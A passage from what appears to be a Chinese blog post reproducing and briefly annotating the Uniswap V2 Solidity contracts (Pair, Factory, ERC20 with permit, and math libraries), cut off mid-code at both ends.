contract which performs important safety checks</span><br><span class="line">    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123;</span><br><span class="line">        require(amount0Out &gt; 0 || amount1Out &gt; 0, &#x27;UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT&#x27;);</span><br><span class="line">        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings</span><br><span class="line">        require(amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line"></span><br><span class="line">        uint balance0;</span><br><span class="line">        uint balance1;</span><br><span class="line">        &#123; // scope for _token&#123;0,1&#125;, avoids stack too deep errors</span><br><span class="line">        address _token0 = token0;</span><br><span class="line">        address _token1 = token1;</span><br><span class="line">        require(to != _token0 &amp;&amp; to != _token1, &#x27;UniswapV2: INVALID_TO&#x27;);</span><br><span class="line">        if (amount0Out &gt; 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens</span><br><span class="line">        if (amount1Out &gt; 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens</span><br><span class="line">        if (data.length &gt; 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);</span><br><span class="line">        balance0 = IERC20(_token0).balanceOf(address(this));</span><br><span class="line">        balance1 = IERC20(_token1).balanceOf(address(this));</span><br><span class="line">        &#125;</span><br><span class="line">        uint amount0In = balance0 &gt; _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;</span><br><span class="line">        uint amount1In = balance1 &gt; _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;</span><br><span class="line">        require(amount0In &gt; 0 || amount1In &gt; 0, &#x27;UniswapV2: INSUFFICIENT_INPUT_AMOUNT&#x27;);</span><br><span class="line">        &#123; // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors</span><br><span class="line">        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));</span><br><span class="line">        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));</span><br><span class="line">        require(balance0Adjusted.mul(balance1Adjusted) &gt;= uint(_reserve0).mul(_reserve1).mul(1000**2), &#x27;UniswapV2: K&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _update(balance0, balance1, _reserve0, _reserve1);</span><br><span class="line">        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // force balances to match reserves</span><br><span class="line">    function skim(address to) external lock &#123;</span><br><span class="line">        address _token0 = token0; // gas savings</span><br><span class="line">        address _token1 = token1; // gas savings</span><br><span class="line">        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));</span><br><span class="line">        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // force reserves to match balances</span><br><span class="line">    function sync() external lock &#123;</span><br><span class="line">        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract UniswapV2Factory is IUniswapV2Factory &#123;</span><br><span class="line">    address public feeTo;</span><br><span class="line">    address public feeToSetter;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; address)) public getPair;</span><br><span class="line">    address[] public allPairs;</span><br><span class="line"></span><br><span class="line">    event PairCreated(address indexed token0, address indexed token1, address pair, uint);</span><br><span class="line"></span><br><span class="line">    constructor(address _feeToSetter) public &#123;</span><br><span class="line">        feeToSetter = _feeToSetter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allPairsLength() external view returns (uint) &#123;</span><br><span class="line">        return allPairs.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function createPair(address tokenA, address tokenB) external returns (address pair) &#123;</span><br><span class="line">        require(tokenA != tokenB, &#x27;UniswapV2: IDENTICAL_ADDRESSES&#x27;);</span><br><span class="line">        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);</span><br><span class="line">        require(token0 != address(0), &#x27;UniswapV2: ZERO_ADDRESS&#x27;);</span><br><span class="line">        require(getPair[token0][token1] == address(0), &#x27;UniswapV2: PAIR_EXISTS&#x27;); // single check is sufficient</span><br><span class="line">        bytes memory bytecode = type(UniswapV2Pair).creationCode;</span><br><span class="line">        bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">        assembly &#123;</span><br><span class="line">            pair := create2(0, add(bytecode, 32), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        IUniswapV2Pair(pair).initialize(token0, token1);</span><br><span class="line">        getPair[token0][token1] = pair;</span><br><span class="line">        getPair[token1][token0] = pair; // populate mapping in the reverse direction</span><br><span class="line">        allPairs.push(pair);</span><br><span class="line">        emit PairCreated(token0, token1, pair, allPairs.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setFeeTo(address _feeTo) external &#123;</span><br><span class="line">        require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;);</span><br><span class="line">        feeTo = _feeTo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setFeeToSetter(address _feeToSetter) external &#123;</span><br><span class="line">        require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;);</span><br><span class="line">        feeToSetter = _feeToSetter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)</span><br><span class="line"></span><br><span class="line">library SafeMath &#123;</span><br><span class="line">    function add(uint x, uint y) internal pure returns (uint z) &#123;</span><br><span class="line">        require((z = x + y) &gt;= x, &#x27;ds-math-add-overflow&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sub(uint x, uint y) internal pure returns (uint z) &#123;</span><br><span class="line">        require((z = x - y) &lt;= x, &#x27;ds-math-sub-underflow&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mul(uint x, uint y) internal pure returns (uint z) &#123;</span><br><span class="line">        require(y == 0 || (z = x * y) / y == x, &#x27;ds-math-mul-overflow&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// a library for performing various math operations</span><br><span class="line"></span><br><span class="line">library Math &#123;</span><br><span class="line">    function min(uint x, uint y) internal pure returns (uint z) &#123;</span><br><span class="line">        z = x &lt; y ? x : y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)</span><br><span class="line">    function sqrt(uint y) internal pure returns (uint z) &#123;</span><br><span class="line">        if (y &gt; 3) &#123;</span><br><span class="line">            z = y;</span><br><span class="line">            uint x = y / 2 + 1;</span><br><span class="line">            while (x &lt; z) &#123;</span><br><span class="line">                z = x;</span><br><span class="line">                x = (y / x + x) / 2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (y != 0) &#123;</span><br><span class="line">            z = 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">library UQ112x112 &#123;</span><br><span class="line">    uint224 constant Q112 = 2**112;</span><br><span class="line"></span><br><span class="line">    // encode a uint112 as a UQ112x112</span><br><span class="line">    function encode(uint112 y) internal pure returns (uint224 z) &#123;</span><br><span class="line">        z = uint224(y) * Q112; // never overflows</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // divide a UQ112x112 by a uint112, returning a UQ112x112</span><br><span class="line">    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) &#123;</span><br><span class="line">        z = x / uint224(y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="UniswapV2ERC20"><a href="#UniswapV2ERC20" class="headerlink" title="UniswapV2ERC20"></a>UniswapV2ERC20</h2><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">contract UniswapV2ERC20 is IUniswapV2ERC20 &#123;</span><br><span class="line">    using SafeMath for uint;</span><br><span class="line"></span><br><span class="line">    string public constant name = &#x27;Uniswap V2&#x27;;</span><br><span class="line">    string public constant symbol = &#x27;UNI-V2&#x27;;</span><br><span class="line">    uint8 public constant decimals = 18;</span><br><span class="line">    uint  public totalSupply;</span><br><span class="line">    mapping(address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint)) public allowance;</span><br><span class="line"></span><br><span class="line">    bytes32 public DOMAIN_SEPARATOR;</span><br><span class="line">    // keccak256(&quot;Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)&quot;);</span><br><span class="line">    bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;</span><br><span class="line">    mapping(address =&gt; uint) public nonces;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint value);</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint value);</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        uint chainId;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            chainId := chainid</span><br><span class="line">        &#125;</span><br><span class="line">        DOMAIN_SEPARATOR = keccak256(</span><br><span class="line">            abi.encode(</span><br><span class="line">                keccak256(&#x27;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&#x27;),</span><br><span class="line">                keccak256(bytes(name)),</span><br><span class="line">                keccak256(bytes(&#x27;1&#x27;)),</span><br><span class="line">                chainId,</span><br><span class="line">                address(this)</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address to, uint value) internal &#123;</span><br><span class="line">        totalSupply = totalSupply.add(value);</span><br><span class="line">        balanceOf[to] = balanceOf[to].add(value);</span><br><span class="line">        emit Transfer(address(0), to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _burn(address from, uint value) internal &#123;</span><br><span class="line">        balanceOf[from] = balanceOf[from].sub(value);</span><br><span class="line">        totalSupply = totalSupply.sub(value);</span><br><span class="line">        emit Transfer(from, address(0), value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(address owner, address spender, uint value) private &#123;</span><br><span class="line">        allowance[owner][spender] = value;</span><br><span class="line">        emit Approval(owner, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address from, address to, uint value) private &#123;</span><br><span class="line">        balanceOf[from] = balanceOf[from].sub(value);</span><br><span class="line">        balanceOf[to] = balanceOf[to].add(value);</span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint value) external returns (bool) &#123;</span><br><span class="line">        _approve(msg.sender, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint value) external returns (bool) &#123;</span><br><span class="line">        _transfer(msg.sender, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint value) external returns (bool) &#123;</span><br><span class="line">        if (allowance[from][msg.sender] != uint(-1)) &#123;</span><br><span class="line">            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);</span><br><span class="line">        &#125;</span><br><span class="line">        _transfer(from, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external &#123;</span><br><span class="line">        require(deadline &gt;= block.timestamp, &#x27;UniswapV2: EXPIRED&#x27;);</span><br><span class="line">        bytes32 digest = keccak256(</span><br><span class="line">            abi.encodePacked(</span><br><span class="line">                &#x27;\x19\x01&#x27;,</span><br><span class="line">                DOMAIN_SEPARATOR,</span><br><span class="line">                keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        address recoveredAddress = ecrecover(digest, v, r, s);</span><br><span class="line">        require(recoveredAddress != address(0) &amp;&amp; recoveredAddress == owner, &#x27;UniswapV2: INVALID_SIGNATURE&#x27;);</span><br><span class="line">        _approve(owner, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h3><p><strong>UniswapV2ERC20就是简单的ERC20合约，只不过多了一个permit允许用签名来完成approve而已</strong></p><h2 id="UniswapV2Pair"><a href="#UniswapV2Pair" class="headerlink" title="UniswapV2Pair"></a>UniswapV2Pair</h2><h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line">contract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20 &#123;</span><br><span class="line">    using SafeMath  for uint;</span><br><span class="line">    using UQ112x112 for uint224;</span><br><span class="line"></span><br><span class="line">    uint public constant MINIMUM_LIQUIDITY = 10**3;</span><br><span class="line">    bytes4 private constant SELECTOR = bytes4(keccak256(bytes(&#x27;transfer(address,uint256)&#x27;)));</span><br><span class="line"></span><br><span class="line">    address public factory;</span><br><span class="line">    address public token0;</span><br><span class="line">    address public token1;</span><br><span class="line"></span><br><span class="line">    uint112 private reserve0;           // uses single storage slot, accessible via getReserves</span><br><span class="line">    uint112 private reserve1;           // uses single storage slot, accessible via getReserves</span><br><span class="line">    uint32  private blockTimestampLast; // uses single storage slot, accessible via getReserves</span><br><span class="line"></span><br><span class="line">    uint public price0CumulativeLast;</span><br><span class="line">    uint public price1CumulativeLast;</span><br><span class="line">    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event</span><br><span class="line"></span><br><span class="line">    uint private unlocked = 1;</span><br><span class="line">    modifier lock() &#123;</span><br><span class="line">        require(unlocked == 1, &#x27;UniswapV2: LOCKED&#x27;);</span><br><span class="line">        unlocked = 0;</span><br><span class="line">        _;</span><br><span class="line">        unlocked = 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) &#123;</span><br><span class="line">        _reserve0 = reserve0;</span><br><span class="line">        _reserve1 = reserve1;</span><br><span class="line">        _blockTimestampLast = blockTimestampLast;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _safeTransfer(address token, address to, uint value) private &#123;</span><br><span class="line">        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));</span><br><span class="line">        require(success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))), &#x27;UniswapV2: TRANSFER_FAILED&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Mint(address indexed sender, uint amount0, uint amount1);</span><br><span class="line">    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);</span><br><span class="line">    event Swap(</span><br><span class="line">        address indexed sender,</span><br><span class="line">        uint amount0In,</span><br><span class="line">        uint amount1In,</span><br><span class="line">        uint amount0Out,</span><br><span class="line">        uint amount1Out,</span><br><span class="line">        address indexed to</span><br><span class="line">    );</span><br><span class="line">    event Sync(uint112 reserve0, uint112 reserve1);</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        factory = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // called once by the factory at time of deployment</span><br><span class="line">    function initialize(address _token0, address _token1) external &#123;</span><br><span class="line">        require(msg.sender == factory, &#x27;UniswapV2: FORBIDDEN&#x27;); // sufficient check</span><br><span class="line">        token0 = _token0;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // update reserves and, on the first call per block, price accumulators</span><br><span class="line">    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private &#123;</span><br><span class="line">        require(balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1), &#x27;UniswapV2: OVERFLOW&#x27;);</span><br><span class="line">        uint32 blockTimestamp = uint32(block.timestamp % 2**32);</span><br><span class="line">        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired</span><br><span class="line">        if (timeElapsed &gt; 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123;</span><br><span class="line">            // * never overflows, and + overflow is desired</span><br><span class="line">            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;</span><br><span class="line">            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;</span><br><span class="line">        &#125;</span><br><span class="line">        reserve0 = uint112(balance0);</span><br><span class="line">        reserve1 = uint112(balance1);</span><br><span class="line">        blockTimestampLast = blockTimestamp;</span><br><span class="line">        emit Sync(reserve0, reserve1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)</span><br><span class="line">    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123;</span><br><span class="line">        address feeTo = IUniswapV2Factory(factory).feeTo();</span><br><span class="line">        feeOn = feeTo != address(0);</span><br><span class="line">        uint _kLast = kLast; // gas savings</span><br><span class="line">        if (feeOn) &#123;</span><br><span class="line">            if (_kLast != 0) &#123;</span><br><span class="line">                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));</span><br><span class="line">                uint rootKLast = Math.sqrt(_kLast);</span><br><span class="line">                if (rootK &gt; rootKLast) &#123;</span><br><span class="line">                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));</span><br><span class="line">                    uint denominator = rootK.mul(5).add(rootKLast);</span><br><span class="line">                    uint liquidity = numerator / denominator;</span><br><span class="line">                    if (liquidity &gt; 0) _mint(feeTo, liquidity);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (_kLast != 0) &#123;</span><br><span class="line">            kLast = 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // this low-level function should be called from a contract which performs important safety checks</span><br><span class="line">    function mint(address to) external lock returns (uint liquidity) &#123;</span><br><span class="line">        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings</span><br><span class="line">        uint balance0 = IERC20(token0).balanceOf(address(this));</span><br><span class="line">        uint balance1 = IERC20(token1).balanceOf(address(this));</span><br><span class="line">        uint amount0 = balance0.sub(_reserve0);</span><br><span class="line">        uint amount1 = balance1.sub(_reserve1);</span><br><span class="line"></span><br><span class="line">        bool feeOn = _mintFee(_reserve0, _reserve1);</span><br><span class="line">        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee</span><br><span class="line">        if (_totalSupply == 0) &#123;</span><br><span class="line">            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);</span><br><span class="line">           _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);</span><br><span class="line">        &#125;</span><br><span class="line">        require(liquidity &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED&#x27;);</span><br><span class="line">        _mint(to, liquidity);</span><br><span class="line"></span><br><span class="line">        _update(balance0, balance1, _reserve0, _reserve1);</span><br><span class="line">        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date</span><br><span class="line">        emit Mint(msg.sender, amount0, amount1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // this low-level function should be called from a contract which performs important safety checks</span><br><span class="line">    function burn(address to) external lock returns (uint amount0, uint amount1) &#123;</span><br><span class="line">        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings</span><br><span class="line">        address _token0 = token0;                                // gas savings</span><br><span class="line">        address _token1 = token1;                                // gas savings</span><br><span class="line">        uint balance0 = IERC20(_token0).balanceOf(address(this));</span><br><span class="line">        uint balance1 = IERC20(_token1).balanceOf(address(this));</span><br><span class="line">        uint liquidity = balanceOf[address(this)];</span><br><span class="line"></span><br><span class="line">        bool feeOn = _mintFee(_reserve0, _reserve1);</span><br><span class="line">        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee</span><br><span class="line">        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution</span><br><span class="line">        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution</span><br><span class="line">        require(amount0 &gt; 0 &amp;&amp; amount1 &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED&#x27;);</span><br><span class="line">        _burn(address(this), liquidity);</span><br><span class="line">        _safeTransfer(_token0, to, amount0);</span><br><span class="line">        _safeTransfer(_token1, to, amount1);</span><br><span class="line">        balance0 = IERC20(_token0).balanceOf(address(this));</span><br><span class="line">        balance1 = IERC20(_token1).balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        _update(balance0, balance1, _reserve0, _reserve1);</span><br><span class="line">        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date</span><br><span class="line">        emit Burn(msg.sender, amount0, amount1, to);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // this low-level function should be called from a contract which performs important safety checks</span><br><span class="line">    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123;</span><br><span class="line">        require(amount0Out &gt; 0 || amount1Out &gt; 0, &#x27;UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT&#x27;);</span><br><span class="line">        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings</span><br><span class="line">        require(amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line"></span><br><span class="line">        uint balance0;</span><br><span class="line">        uint balance1;</span><br><span class="line">        &#123; // scope for _token&#123;0,1&#125;, avoids stack too deep errors</span><br><span class="line">        address _token0 = token0;</span><br><span class="line">        address _token1 = token1;</span><br><span class="line">        require(to != _token0 &amp;&amp; to != _token1, &#x27;UniswapV2: INVALID_TO&#x27;);</span><br><span class="line">        if (amount0Out &gt; 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens</span><br><span class="line">        if (amount1Out &gt; 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens</span><br><span class="line">        if (data.length &gt; 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);</span><br><span class="line">        balance0 = IERC20(_token0).balanceOf(address(this));</span><br><span class="line">        balance1 = IERC20(_token1).balanceOf(address(this));</span><br><span class="line">        &#125;</span><br><span class="line">        uint amount0In = balance0 &gt; 